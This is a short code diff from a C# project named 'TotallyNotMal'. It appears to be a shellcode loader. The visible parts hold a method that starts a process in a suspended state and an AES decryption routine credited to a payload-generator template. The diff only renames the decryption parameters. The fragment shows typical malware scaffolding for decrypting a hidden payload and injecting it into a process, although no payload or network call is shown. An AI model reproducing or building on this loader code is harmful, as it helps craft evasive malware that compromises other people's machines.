@@ -170,7 +170,6 @@ namespace TotallyNotMal
             }
         }
 
-
         public static PROCESS_INFORMATION StartProcess(string binaryPath)
         {
             uint flags = 0x00000004;
@@ -202,14 +201,14 @@ namespace TotallyNotMal
         }
 
         //https://raw.githubusercontent.com/smokeme/payloadGenerator/main/xor/template
-        public static string DecryptStringFromBytes(byte[] cipherText, byte[] Key, byte[] IV)
+        public static string DecryptStringFromBytes(byte[] cipherText, byte[] rawKey, byte[] rawIV)
         {
             // Check arguments.
             if (cipherText == null || cipherText.Length <= 0)
                 throw new ArgumentNullException("cipherText");
-            if (Key == null || Key.Length <= 0)
+            if (rawKey == null || rawKey.Length <= 0)
                 throw new ArgumentNullException("Key");
-            if (IV == null || IV.Length <= 0)
+            if (rawIV == null || rawIV.Length <= 0)
                 throw new ArgumentNullException("Key");
 
             // Declare the string used to hold
@@ -220,8 +219,8 @@ namespace TotallyNotMal
             // with the specified key and IV.
             using (RijndaelManaged rijAlg = new RijndaelManaged())
             {
-                rijAlg.Key = Key;
-                rijAlg.IV = IV;
+                rijAlg.Key = rawKey;
+                rijAlg.IV = rawIV;
 
                 // Create a decrytor to perform the stream transform.
                 ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
